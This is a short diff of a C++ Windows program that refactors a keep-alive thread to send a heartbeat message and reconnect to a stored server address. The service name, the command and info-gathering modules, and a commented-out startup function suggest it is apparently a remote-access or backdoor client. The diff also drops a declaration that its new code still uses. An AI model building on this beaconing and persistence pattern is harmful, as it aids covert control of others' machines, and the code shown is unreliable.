@@ -15,7 +15,6 @@
 #include "Logger.h"
 #include "InfoSenser.h"
 #include "Communicater.h"
-#include "HeadDic.h"
 #include <direct.h>
 #include <stdlib.h>
 #include <fstream>
@@ -31,7 +30,6 @@ std::string command;
 std::string keeperPath("");
 std::string thispath("");
 extern const char* MY_SERVICE_NAME = "testservice";
-struct HeadDic headDic;
 bool checkerNeed = true;
 bool setterNeed = true;
 bool aliveKeeperNeed = true;
@@ -133,10 +131,13 @@ DWORD WINAPI keepAliveThread(LPVOID pM) {
 	while(true){
 		while (aliveKeeperNeed) {
 			_sleep(1000);
-			while (!cmtr->mySend("alive\n")) {
+			while (!send_keepalive_message()){
 				_sleep(1000);
 				try {
 					logger->log("[Alive Keeper]KeepAlive failed, resetting connection!");
+					cmtr->connectTillSuccess(cmtr->ip, cmtr->port);
+					/*Communicater *cmtr_cache_old = cmtr;
+					Communicater *cmtr_cache_old = new Communicater();*/
 				}
 				catch(DWORD dwE){
 					std::cout << "rest failed" << std::endl;
@@ -148,6 +149,9 @@ DWORD WINAPI keepAliveThread(LPVOID pM) {
 	return true;
 }
 
+bool send_keepalive_message() {
+	return (bool)cmtr->mySend(headDic.keepAlive);
+}
 /*
 int addToStartUP() {
 	char system[MAX_PATH];
